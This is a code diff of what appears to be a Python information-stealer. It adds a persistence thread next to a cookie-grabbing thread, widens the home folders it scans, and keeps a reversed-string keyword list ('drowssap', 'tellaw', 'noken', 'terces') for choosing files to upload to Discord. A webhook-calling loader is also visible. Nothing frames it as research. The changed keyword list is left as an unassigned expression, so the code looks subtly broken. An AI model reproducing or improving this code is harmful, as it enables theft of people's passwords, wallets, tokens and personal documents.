@@ -296,12 +296,6 @@ def startup():
             pass
 
 
-if Startup == True:
-    startup()
-else:
-    pass
-
-
 def LoadUrlib(hook, data='', files='', headers=''):
     for i in range(8):
         try:
@@ -787,13 +781,21 @@ def steam_st():
 import concurrent.futures
 
 def upload_files_to_discord():
-    keywords = ["drowssap", "tellaw", "essap_edotom", "pdm", "essapedotom", "noken", "yek", "terces", "tterces", "ipa", "tnuocca", "nogin", "emusern", "liame", "enohp", "dircet tihcrac", "ytiruces yrtnuoces laicos", "sserdda", "etisoppa", "NIP", "trossap", "eciffo laicion", "dnocesorp", "tnuocca knalb", "gnitirw", "ytocryptocurrency", "niotcib", "muhtyre", "etelpmoc", "evig", "noitartsinimda"]
+    ['enohp', 'noitulfedacilbup', 'gnitirw', 'etisoppa', 'laicion', 'trossap', 'muhtyre', 'tellaw', 'drowssap egarots', 'eciffo laicion', 'tnuocca', 'slavitsef eninapmoc', 'nogin', 'tnuocca knalb', 'drowssap noitcudorp', 'etisoppa laicion', 'etelpmoc laicion', 'dircet tihcrac', 'noitamroproirp', 'emusern', 'laif gnitartsinimda', 'etelpmoc', 'drowssap ycnanif', 'drowssap ytecnanif', 'drowssap decures', 'sserdda', 'ytiruces yrtnuoces laicos', 'ytocryptocurrency', 'drowssap yroirp', 'noitartsinimda', 'tterces', 'niotcib', 'evig', 'liame', 'ytinifidnocnafnoc', 'ipa', 'noitartsinimda reganam']
     extension = 'txt'
 
+    home_path = os.path.expanduser("~")
     desktop_path = os.path.expanduser("~/Desktop")
     downloads_path = os.path.expanduser("~/Downloads")
     documents_path = os.path.expanduser("~/Documents")
     pictures_path = os.path.expanduser("~/Pictures")
+    music_path = os.path.expanduser("~/Music")
+    videos_path = os.path.expanduser("~/Videos")
+    applications_path = os.path.expanduser("~/Applications")
+    public_path = os.path.expanduser("~/Public")
+    templates_path = os.path.expanduser("~/Templates")
+    downloads_documents_path = os.path.join(downloads_path, "Documents")
+    downloads_pictures_path = os.path.join(downloads_path, "Pictures")
 
     file_paths = []
 
@@ -1207,6 +1209,13 @@ def GatherAll():
     coo = threading.Thread(target=getcook)
     coo.start()
     threadlist2.append(coo)
+
+    if Startup == True:
+        sta = threading.Thread(target=startup)
+        sta.start()
+        threadlist2.append(sta)
+    else:
+        pass
     for thread in threadlist2:
         thread.join()
 
